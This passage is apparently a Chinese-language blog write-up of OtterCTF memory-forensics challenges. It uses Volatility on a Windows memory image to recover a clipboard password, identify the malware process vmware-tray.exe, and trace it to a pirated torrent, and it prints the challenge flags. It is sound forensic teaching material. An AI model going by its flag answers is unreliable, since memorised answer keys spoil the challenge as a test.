UTC+0000                                 0x000000007de31b30 svchost.exe         844    492 0x000000001ff36000 2018-08-04 19:26:18 UTC+0000                                 0x000000007de4db30 svchost.exe         868    492 0x000000002027f000 2018-08-04 19:26:18 UTC+0000                                 0x000000007de753a0 audiodg.exe         960    808 0x000000001f6df000 2018-08-04 19:26:19 UTC+0000                                 0x000000007de97060 svchost.exe        1012    492 0x000000001f58e000 2018-08-04 19:26:20 UTC+0000                                 0x000000007ded37e0 svchost.exe         620    492 0x000000001e7a0000 2018-08-04 19:26:21 UTC+0000                                 0x000000007df5ab30 spoolsv.exe        1120    492 0x000000001b0e7000 2018-08-04 19:26:22 UTC+0000                                 0x000000007df718a0 svchost.exe        1164    492 0x000000001ac36000 2018-08-04 19:26:23 UTC+0000                                 0x000000007e000a90 chrome.exe         3924   4076 0x00000000006ba000 2018-08-04 19:29:51 UTC+0000                                 0x000000007e072b30 sc.exe             3504   3880 0x0000000040331000 2018-08-04 19:33:48 UTC+0000   2018-08-04 19:33:48 UTC+0000  0x000000007e0d1060 Lavasoft.WCAss     3496    492 0x0000000078089000 2018-08-04 19:33:49 UTC+0000                                 0x000000007e0f4060 winlogon.exe        432    380 0x00000000237dc000 2018-08-04 19:26:11 UTC+0000                                 0x000000007e1377c0 services.exe        492    396 0x000000002257a000 2018-08-04 19:26:12 UTC+0000                                 0x000000007e13f060 lsass.exe           500    396 0x000000002219a000 2018-08-04 19:26:12 UTC+0000                                 0x000000007e1461a0 lsm.exe             508    396 0x00000000221a2000 2018-08-04 19:26:12 UTC+0000                                 0x000000007e1bdb30 vmacthlp.exe        668    492 0x000000002120e000 2018-08-04 19:26:16 UTC+0000                                 0x000000007e1ebb30 svchost.exe         712    492 0x0000000020d1c000 2018-08-04 19:26:17 UTC+0000                                 0x000000007e4268b0 WebCompanion.e     3856   3880 0x000000003c956000 2018-08-04 19:34:05 UTC+0000                                 0x000000007e435240 chrome.exe         3648   4076 0x0000000067df6000 2018-08-04 19:33:38 UTC+0000                                 0x000000007e4643d0 conhost.exe        2420    348 0x0000000075907000 2018-08-04 19:34:22 UTC+0000   2018-08-04 19:34:22 UTC+0000  0x000000007e4af9f0 svchost.exe         164    492 0x000000003ffbd000 2018-08-04 19:28:42 UTC+0000                                 0x000000007e4c2700 mscorsvw.exe       3124    492 0x000000003fa08000 2018-08-04 19:28:43 UTC+0000                                 0x000000007e4e4b30 svchost.exe        3196    492 0x000000003e5d5000 2018-08-04 19:28:44 UTC+0000                                 0x000000007e5bfb30 ipconfig.exe       3788   3916 0x0000000039194000 2018-08-04 19:34:22 UTC+0000   2018-08-04 19:34:22 UTC+0000  0x000000007e5f98f0 chrome.exe         2748   4076 0x0000000074a76000 2018-08-04 19:31:15 UTC+0000                                 0x000000007e6c5b30 vmware-tray.ex     3720   3820 0x000000007653c000 2018-08-04 19:33:02 UTC+0000                                 0x000000007e6e3870 chrome.exe         4076   2728 0x0000000033cdc000 2018-08-04 19:29:30 UTC+0000                                 0x000000007e6eab30 chrome.exe         4084   4076 0x000000003338b000 2018-08-04 19:29:30 UTC+0000                                 0x000000007e6f7b30 chrome.exe         1808   4076 0x000000003ae8a000 2018-08-04 19:29:32 UTC+0000                                 0x000000007e702b30 chrome.exe          576   4076 0x0000000003f38000 2018-08-04 19:29:31 UTC+0000                                 0x000000007e772b30 cmd.exe            3916   1428 0x00000000199c1000 2018-08-04 19:34:22 UTC+0000   2018-08-04 19:34:22 UTC+0000  0x000000007e7ef1f0 chrome.exe         1796   4076 0x000000002b91a000 2018-08-04 19:33:41 UTC+0000                                 0x000000007e7fe210 SearchProtocol     3428   3064 0x0000000010edf000 2018-08-04 19:33:11 UTC+0000   2018-08-04 19:34:22 UTC+0000  0x000000007e8ed060 wininit.exe         396    336 0x00000000244f5000 2018-08-04 19:26:11 UTC+0000                                 0x000000007eac8380 csrss.exe           348    336 0x00000000245af000 2018-08-04 19:26:10 UTC+0000                                 0x000000007f28c2d0 PresentationFo      724    492 0x000000006541b000 2018-08-04 19:27:52 UTC+0000                                 0x000000007f2d3b30 csrss.exe           388    380 0x0000000074a96000 2018-08-04 19:26:11 UTC+0000                                 0x000000007f67e4d0 smss.exe            260      4 0x000000002abc9000 2018-08-04 19:26:03 UTC+0000                                 0x000000007fb24b30 WmiPrvSE.exe       1800    604 0x00000000134a3000 2018-08-04 19:26:39 UTC+0000                                 0x000000007fc3c890 svchost.exe         604    492 0x0000000021336000 2018-08-04 19:26:16 UTC+0000                                 0x000000007fe83740 System                4      0 0x0000000000187000 2018-08-04 19:26:03 UTC+0000                                 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把LunarMS.exe 也就是708 dump出来</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 memdump -p 708 -D ./Volatility Foundation Volatility Framework 2.6************************************************************************Writing LunarMS.exe <span class="token punctuation">[</span>   708<span class="token punctuation">]</span> to 708.dmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后就在里面找0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2}</p><pre class="line-numbers language-bash"><code class="language-bash">strings 708.dmp<span class="token operator">|</span><span class="token function">grep</span> Z <span class="token operator">|</span><span class="token function">grep</span> d <span class="token operator">|</span><span class="token function">grep</span> @<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现太多了，只能换hashdump了</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop hexdump -C 708.dmp <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"5a 0c 00"</span> -A 3 -B 3 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>0b04ac30  10 00 00 00 00 35 c1 50  00 00 00 00 ec 0f 00 00  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.5.P<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>0b04ac40  84 c7 b6 1c 10 00 00 00  00 35 c1 50 64 0f c9 1c  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.5.Pd<span class="token punctuation">..</span>.<span class="token operator">|</span>0b04ac50  14 18 00 00 98 5a 6e 46  10 00 00 00 00 35 c1 50  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.ZnF<span class="token punctuation">..</span><span class="token punctuation">..</span>.5.P<span class="token operator">|</span>0b04ac60  00 00 00 00 5a 0c 00 00  64 c5 22 1e 10 00 00 00  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span>Z<span class="token punctuation">..</span>.d.<span class="token string">".....|0b04ac70  00 35 c1 50 6c 77 f8 1c  d3 a5 18 00 50 f5 04 1e  |.5.Plw......P...|0b04ac80  10 00 00 00 00 35 c1 50  48 b9 28 1f bd 1f 00 00  |.....5.PH.(.....|0b04ac90  fc 13 6f 46 10 00 00 00  00 35 c1 50 00 00 00 00  |..oF.....5.P....|--0c33a470  55 44 81 ab 55 44 81 ab  5c 4d ef a3 44 e7 fa 08  |UD..UD..\M..D...|0c33a480  dc 2d de 08 f6 e7 22 08  f6 e7 22 08 5c 4d 98 d4  |.-...."</span><span class="token punctuation">..</span>.<span class="token string">".\M..|0c33a490  db 68 8a 0c 00 00 00 80  92 06 00 00 ac 00 00 00  |.h..............|0c33a4a0  9a 23 32 23 0b 00 00 01  5a 0c 00 00 4d 30 72 74  |.#2#....Z...M0rt|0c33a4b0  79 4c 30 4c 00 00 00 00  00 00 00 21 4e 00 00 55  |yL0L.......!N..U|0c33a4c0  75 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |u...............|0c33a4d0  00 00 00 00 00 00 00 00  00 00 00 a4 00 00 3b 03  |..............;.|--0d4348e0  d0 f2 4c ce 31 15 f7 28  46 11 21 0f 86 15 a5 e5  |..L.1..(F.!.....|0d4348f0  0d 52 30 69 48 06 c7 9f  2d ae 6e e7 78 44 7b 53  |.R0iH...-.n.xD&amp;#123;S|0d434900  ba 7d bc c2 b8 f9 74 7d  45 f5 64 6b 77 aa e3 70  |.&amp;#125;....t&amp;#125;E.dkw..p|0d434910  ff e9 d3 5d 10 88 84 de  01 1e 96 48 9c 5a 0c 00  |...].......H.Z..|0d434920  58 22 7c c5 0d 09 7b 51  21 f7 ce 48 1b 97 81 33  |X"</span><span class="token operator">|</span><span class="token punctuation">..</span>.<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;Q!..H...3|</span>0d434930  00 f2 4d 3b 59 d5 e4 b5  ac ef 11 1d ba 47 ee ba  <span class="token operator">|</span><span class="token punctuation">..</span>M<span class="token punctuation">;</span>Y<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>G<span class="token punctuation">..</span><span class="token operator">|</span>0d434940  4e ff 95 4e d2 b9 60 0c  f3 99 e4 fd c9 04 6c 79  <span class="token operator">|</span>N<span class="token punctuation">..</span>N<span class="token punctuation">..</span>`<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.ly<span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;M0rtyL0L&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="6-Silly-Rick-100"><a href="#6-Silly-Rick-100" class="headerlink" title="6 - Silly Rick 100"></a>6 - Silly Rick 100</h1><p>##question<br>Silly rick always forgets his email’s password, so he uses a Stored Password Services online to store his password. He always copy and paste the password so he will not get it wrong. whats rick’s email password?</p><p>format: CTF{flag}<br>##solve<br>都说了copy了，直接看粘贴板</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 clipboardVolatility Foundation Volatility Framework 2.6Session    WindowStation Format                         Handle Object             Data                                              ---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------         1 WinSta0       CF_UNICODETEXT                0x602e3 0xfffff900c1ad93f0 M@il_Pr0vid0rs                                             1 WinSta0       CF_TEXT                          0x10 ------------------                                                            1 WinSta0       0x150133L              0x200000000000 ------------------                                                            1 WinSta0       CF_TEXT                           0x1 ------------------                                                            1 ------------- ------------------           0x150133 0xfffff900c1c1adc0                                                   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;M@il_Pr0vid0rs&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="7-Hide-And-Seek-100"><a href="#7-Hide-And-Seek-100" class="headerlink" title="7- Hide And Seek 100"></a>7- Hide And Seek 100</h1><p>##question<br>The reason that we took rick’s PC memory dump is because there was a malware infection. Please find the malware process name (including the extension)</p><p>BEAWARE! There are only 3 attempts to get the right flag!</p><p>format: CTF{flag}</p><p>##solve<br>pstree一下</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 pstreeVolatility Foundation Volatility Framework 2.6Name                                                  Pid   PPid   Thds   Hnds Time-------------------------------------------------- ------ ------ ------ ------ ---- 0xfffffa801b27e060:explorer.exe                     2728   2696     33    854 2018-08-04 19:27:04 UTC+0000<span class="token keyword">.</span> 0xfffffa801b486b30:Rick And Morty                  3820   2728      4    185 2018-08-04 19:32:55 UTC+0000<span class="token punctuation">..</span> 0xfffffa801a4c5b30:vmware-tray.ex                 3720   3820      8    147 2018-08-04 19:33:02 UTC+0000<span class="token keyword">.</span> 0xfffffa801b2f02e0:WebCompanion.e                  2844   2728      0 ------ 2018-08-04 19:27:07 UTC+0000<span class="token keyword">.</span> 0xfffffa801a4e3870:chrome.exe                      4076   2728     44   1160 2018-08-04 19:29:30 UTC+0000<span class="token punctuation">..</span> 0xfffffa801a4eab30:chrome.exe                     4084   4076      8     86 2018-08-04 19:29:30 UTC+0000<span class="token punctuation">..</span> 0xfffffa801a5ef1f0:chrome.exe                     1796   4076     15    170 2018-08-04 19:33:41 UTC+0000<span class="token punctuation">..</span> 0xfffffa801aa00a90:chrome.exe                     3924   4076     16    228 2018-08-04 19:29:51 UTC+0000<span class="token punctuation">..</span> 0xfffffa801a635240:chrome.exe                     3648   4076     16    207 2018-08-04 19:33:38 UTC+0000<span class="token punctuation">..</span> 0xfffffa801a502b30:chrome.exe                      576   4076      2     58 2018-08-04 19:29:31 UTC+0000<span class="token punctuation">..</span> 0xfffffa801a4f7b30:chrome.exe                     1808   4076     13    229 2018-08-04 19:29:32 UTC+0000<span class="token punctuation">..</span> 0xfffffa801a7f98f0:chrome.exe                     2748   4076     15    181 2018-08-04 19:31:15 UTC+0000<span class="token keyword">.</span> 0xfffffa801b5cb740:LunarMS.exe                      708   2728     18    346 2018-08-04 19:27:39 UTC+0000<span class="token keyword">.</span> 0xfffffa801b1cdb30:vmtoolsd.exe                    2804   2728      6    190 2018-08-04 19:27:06 UTC+0000<span class="token keyword">.</span> 0xfffffa801b290b30:BitTorrent.exe                  2836   2728     24    471 2018-08-04 19:27:07 UTC+0000<span class="token punctuation">..</span> 0xfffffa801b4c9b30:bittorrentie.e                 2624   2836     13    316 2018-08-04 19:27:21 UTC+0000<span class="token punctuation">..</span> 0xfffffa801b4a7b30:bittorrentie.e                 2308   2836     15    337 2018-08-04 19:27:19 UTC+0000 0xfffffa8018d44740:System                              4      0     95    411 2018-08-04 19:26:03 UTC+0000<span class="token keyword">.</span> 0xfffffa801947e4d0:smss.exe                         260      4      2     30 2018-08-04 19:26:03 UTC+0000 0xfffffa801a2ed060:wininit.exe                       396    336      3     78 2018-08-04 19:26:11 UTC+0000<span class="token keyword">.</span> 0xfffffa801ab377c0:services.exe                     492    396     11    242 2018-08-04 19:26:12 UTC+0000<span class="token punctuation">..</span> 0xfffffa801afe7800:svchost.exe                    1948    492      6     96 2018-08-04 19:26:42 UTC+0000<span class="token punctuation">..</span> 0xfffffa801ae92920:vmtoolsd.exe                   1428    492      9    313 2018-08-04 19:26:27 UTC+0000<span class="token punctuation">..</span>. 0xfffffa801a572b30:cmd.exe                       3916   1428      0 ------ 2018-08-04 19:34:22 UTC+0000<span class="token punctuation">..</span> 0xfffffa801ae0f630:VGAuthService.                 1356    492      3     85 2018-08-04 19:26:25 UTC+0000<span class="token punctuation">..</span> 0xfffffa801abbdb30:vmacthlp.exe                    668    492      3     56 2018-08-04 19:26:16 UTC+0000<span class="token punctuation">..</span> 0xfffffa801aad1060:Lavasoft.WCAss                 3496    492     14    473 2018-08-04 19:33:49 UTC+0000<span class="token punctuation">..</span> 0xfffffa801a6af9f0:svchost.exe                     164    492     12    147 2018-08-04 19:28:42 UTC+0000<span class="token punctuation">..</span> 0xfffffa801ac2e9e0:svchost.exe                     808    492     22    508 2018-08-04 19:26:18 UTC+0000<span class="token punctuation">..</span>. 0xfffffa801ac753a0:audiodg.exe                    960    808      7    151 2018-08-04 19:26:19 UTC+0000<span class="token punctuation">..</span> 0xfffffa801ae7f630:dllhost.exe                    1324    492     15    207 2018-08-04 19:26:42 UTC+0000<span class="token punctuation">..</span> 0xfffffa801a6c2700:mscorsvw.exe                   3124    492      7     77 2018-08-04 19:28:43 UTC+0000<span class="token punctuation">..</span> 0xfffffa801b232060:sppsvc.exe                     2500    492      4    149 2018-08-04 19:26:58 UTC+0000<span class="token punctuation">..</span> 0xfffffa801abebb30:svchost.exe                     712    492      8    301 2018-08-04 19:26:17 UTC+0000<span class="token punctuation">..</span> 0xfffffa801ad718a0:svchost.exe                    1164    492     18    312 2018-08-04 19:26:23 UTC+0000<span class="token punctuation">..</span> 0xfffffa801ac31b30:svchost.exe                     844    492     17    396 2018-08-04 19:26:18 UTC+0000<span class="token punctuation">..</span>. 0xfffffa801b1fab30:dwm.exe                       2704    844      4     97 2018-08-04 19:27:04 UTC+0000<span class="token punctuation">..</span> 0xfffffa801988c2d0:PresentationFo                  724    492      6    148 2018-08-04 19:27:52 UTC+0000<span class="token punctuation">..</span> 0xfffffa801b603610:mscorsvw.exe                    412    492      7     86 2018-08-04 19:28:42 UTC+0000<span class="token punctuation">..</span> 0xfffffa8018e3c890:svchost.exe                     604    492     11    376 2018-08-04 19:26:16 UTC+0000<span class="token punctuation">..</span>. 0xfffffa8019124b30:WmiPrvSE.exe                  1800    604      9    222 2018-08-04 19:26:39 UTC+0000<span class="token punctuation">..</span>. 0xfffffa801b112060:WmiPrvSE.exe                  2136    604     12    324 2018-08-04 19:26:51 UTC+0000<span class="token punctuation">..</span> 0xfffffa801ad5ab30:spoolsv.exe                    1120    492     14    346 2018-08-04 19:26:22 UTC+0000<span class="token punctuation">..</span> 0xfffffa801ac4db30:svchost.exe                     868    492     45   1114 2018-08-04 19:26:18 UTC+0000<span class="token punctuation">..</span> 0xfffffa801a6e4b30:svchost.exe                    3196    492     14    352 2018-08-04 19:28:44 UTC+0000<span class="token punctuation">..</span> 0xfffffa801acd37e0:svchost.exe                     620    492     19    415 2018-08-04 19:26:21 UTC+0000<span class="token punctuation">..</span> 0xfffffa801b1e9b30:taskhost.exe                   2344    492      8    193 2018-08-04 19:26:57 UTC+0000<span class="token punctuation">..</span> 0xfffffa801ac97060:svchost.exe                    1012    492     12    554 2018-08-04 19:26:20 UTC+0000<span class="token punctuation">..</span> 0xfffffa801b3aab30:SearchIndexer.                 3064    492     11    610 2018-08-04 19:27:14 UTC+0000<span class="token punctuation">..</span> 0xfffffa801aff3b30:msdtc.exe                      1436    492     14    155 2018-08-04 19:26:43 UTC+0000<span class="token keyword">.</span> 0xfffffa801ab3f060:lsass.exe                        500    396      7    610 2018-08-04 19:26:12 UTC+0000<span class="token keyword">.</span> 0xfffffa801ab461a0:lsm.exe                          508    396     10    148 2018-08-04 19:26:12 UTC+0000 0xfffffa801a0c8380:csrss.exe                         348    336      9    563 2018-08-04 19:26:10 UTC+0000<span class="token keyword">.</span> 0xfffffa801a6643d0:conhost.exe                     2420    348      0     30 2018-08-04 19:34:22 UTC+0000 0xfffffa80198d3b30:csrss.exe                         388    380     11    460 2018-08-04 19:26:11 UTC+0000 0xfffffa801aaf4060:winlogon.exe                      432    380      3    113 2018-08-04 19:26:11 UTC+0000 0xfffffa801b18f060:WebCompanionIn                   3880   1484     15    522 2018-08-04 19:33:07 UTC+0000<span class="token keyword">.</span> 0xfffffa801aa72b30:sc.exe                          3504   3880      0 ------ 2018-08-04 19:33:48 UTC+0000<span class="token keyword">.</span> 0xfffffa801aeb6890:sc.exe                           452   3880      0 ------ 2018-08-04 19:33:48 UTC+0000<span class="token keyword">.</span> 0xfffffa801a6268b0:WebCompanion.e                  3856   3880     15    386 2018-08-04 19:34:05 UTC+0000<span class="token keyword">.</span> 0xfffffa801b08f060:sc.exe                          3208   3880      0 ------ 2018-08-04 19:33:47 UTC+0000<span class="token keyword">.</span> 0xfffffa801ac01060:sc.exe                          2028   3880      0 ------ 2018-08-04 19:33:49 UTC+0000 0xfffffa801b1fd960:notepad.exe                      3304   3132      2     79 2018-08-04 19:34:10 UTC+0000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很多都是没用的，但是看到有一个很奇怪，ppid比pid还大</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">..</span> 0xfffffa801a4c5b30:vmware-tray.ex                 3720   3820      8    147 2018-08-04 19:33:02 UTC+0000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>dlllist一下</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 dlllist -p 3820Volatility Foundation Volatility Framework 2.6************************************************************************Rick And Morty pid:   3820Command line <span class="token keyword">:</span> <span class="token string">"C:\Torrents\Rick And Morty season 1 download.exe"</span> Note: use ldrmodules <span class="token keyword">for</span> listing DLLs <span class="token keyword">in</span> Wow64 processesBase                             Size          LoadCount LoadTime                       Path------------------ ------------------ ------------------ ------------------------------ ----0x0000000000400000            0x56000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Torrents\Rick And Morty season 1 download.exe0x00000000776f0000           0x1a9000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll0x0000000075210000            0x3f000                0x3 2018-08-04 19:32:55 UTC+0000   C:\Windows\SYSTEM32\wow64.dll0x00000000751b0000            0x5c000                0x1 2018-08-04 19:32:55 UTC+0000   C:\Windows\SYSTEM32\wow64win.dll0x00000000751a0000             0x8000                0x1 2018-08-04 19:32:55 UTC+0000   C:\Windows\SYSTEM32\wow64cpu.dll➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 dlllist -p 3720Volatility Foundation Volatility Framework 2.6************************************************************************vmware-tray.ex pid:   3720Command line <span class="token keyword">:</span> <span class="token string">"C:\Users\Rick\AppData\Local\Temp\RarSFX0\vmware-tray.exe"</span> Note: use ldrmodules <span class="token keyword">for</span> listing DLLs <span class="token keyword">in</span> Wow64 processesBase                             Size          LoadCount LoadTime                       Path------------------ ------------------ ------------------ ------------------------------ ----0x0000000000ec0000            0x6e000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Users\Rick\AppData\Local\Temp\RarSFX0\vmware-tray.exe0x00000000776f0000           0x1a9000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll0x0000000075210000            0x3f000                0x3 2018-08-04 19:33:03 UTC+0000   C:\Windows\SYSTEM32\wow64.dll0x00000000751b0000            0x5c000                0x1 2018-08-04 19:33:03 UTC+0000   C:\Windows\SYSTEM32\wow64win.dll0x00000000751a0000             0x8000                0x1 2018-08-04 19:33:03 UTC+0000   C:\Windows\SYSTEM32\wow64cpu.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>temp执行，看起来就有问题了，就他了<br>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;vmware-tray.exe&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="8-Path-To-Glory-150"><a href="#8-Path-To-Glory-150" class="headerlink" title="8 - Path To Glory 150"></a>8 - Path To Glory 150</h1><p>##question<br>How did the malware got to rick’s PC? It must be one of rick old illigal habits…<br>format: CTF{…}</p><p>##solve<br>malware，那就是看软件了，filescan一下，发现太多，过滤出rick还是多，以Rick And Morty过滤</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 filescan <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"Rick And Morty"</span>Volatility Foundation Volatility Framework 2.60x000000007d63dbc0     10      0 R--r-d \Device\HarddiskVolume1\Torrents\Rick And Morty season 1 download.exe0x000000007d8813c0      2      0 RW-rwd \Device\HarddiskVolume1\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrent0x000000007da56240      2      0 RW-rwd \Device\HarddiskVolume1\Torrents\Rick And Morty season 1 download.exe0x000000007dae9350      2      0 RWD--- \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\BitTorrent\Rick And Morty season 1 download.exe.1.torrent0x000000007dcbf6f0      2      0 RW-rwd \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\BitTorrent\Rick And Morty season 1 download.exe.1.torrent0x000000007e710070      8      0 R--rwd \Device\HarddiskVolume1\Torrents\Rick And Morty season 1 download.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把文件dump出来</p><pre><code>➜  Desktop volatility -f OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007dae9350 -D .Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7dae9350   None   \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\BitTorrent\Rick And Morty season 1 download.exe.1.torrent➜  Desktop ➜  Desktop ls1.py                              MS17-010       pwn_exp.py3720.dmp                          OtterCTF.7z    pygmcryptoexecutable.3720.exe               OtterCTF.vmem  strings.txtf                                 out.txt        verinfo.txtfile.None.0xfffffa801b42c9e0.dat  plugin         volatility-2.6.ziph.dd                              pwn            volatility-masterhelp.txt                          pwn_1          welcome.zip➜  Desktop strings file.None.0xfffffa801b42c9e0.datd8:announce44:udp://tracker.openbittorrent.com:80/announce13:announce-listll44:udp://tracker.openbittorrent.com:80/announceel42:udp://tracker.opentrackr.org:1337/announceee10:created by17:BitTorrent/7.10.313:creation datei1533150595e8:encoding5:UTF-84:infod6:lengthi456670e4:name36:Rick And Morty season 1 download.exe12:piece lengthi16384e6:pieces560:\I!PC&lt;^XB.k_Rk0&lt;;O87o!4^&quot;3hq,&amp;iW1|K68:ow~Q~YT$$o9pbwF:ue7:website19:M3an_T0rren7_4_R!cke</code></pre><p>##flag</p><pre class="line-numbers language-bash"><code class="language-bash">CTF<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;M3an_T0rren7_4_R!ck&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="9-Path-To-Glory-200"><a href="#9-Path-To-Glory-200" class="headerlink" title="9 - Path To Glory 200"></a>9 - Path To Glory 200</h1><p>##question<br>Continue the search after the the way that malware got in.<br>format: CTF{…}</p><p>##solve<br>先dump出所有的chrome进程</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop volatility -f OtterCTF.vmem --profile<span class="token operator">=</span>Win7SP1x64 memdump -n chrome -D ./f/Volatility Foundation Volatility Framework 2.6************************************************************************Writing chrome.exe <span class="token punctuation">[</span>  4076<span class="token punctuation">]</span> to 4076.dmp************************************************************************Writing chrome.exe <span class="token punctuation">[</span>  4084<span class="token punctuation">]</span> to 4084.dmp************************************************************************Writing chrome.exe <span class="token punctuation">[</span>   576<span class="token punctuation">]</span> to 576.dmp************************************************************************Writing chrome.exe <span class="token punctuation">[</span>  1808<span class="token punctuation">]</span> to 1808.dmp************************************************************************Writing chrome.exe <span class="token punctuation">[</span>  3924<span class="token punctuation">]</span> to 3924.dmp************************************************************************Writing chrome.exe <span class="token punctuation">[</span>  2748<span class="token punctuation">]</span> to 2748.dmp************************************************************************Writing chrome.exe <span class="token punctuation">[</span>  3648<span class="token punctuation">]</span> to 3648.dmp************************************************************************Writing chrome.exe <span class="token punctuation">[</span>  1796<span class="token punctuation">]</span> to 1796.dmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查找下download.exe.torren</p><pre class="line-numbers language-bash"><code class="language-bash">➜  Desktop strings ./f/* <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"download\.exe\.torrent"</span> Rick And Morty season 1 download.exe.torrent<span class="token operator">==</span>e1f778b7-adf6-48f2-816d-740c99c5f9a4C:\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrentC:\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrent<span class="token operator">==</span>de371043-340d-42e5-8e16-90e6fbfbc509C:\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrentC:\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrentVisited: Rick@file:///C:/Users/Rick/Downloads/Rick%20And%20Morty%20season%201%20download.exe.torrentRick And Morty season 1 download.exe.torrentRick And Morty season 1 download.exe.torrentRick And Morty season 1 download.exe.torrentRick And Morty season 1 download.exe.torrentContent-Disposition: attachment<span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"Rick And Morty season 1 download.exe.torrent"</span>attachment<span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"Rick And 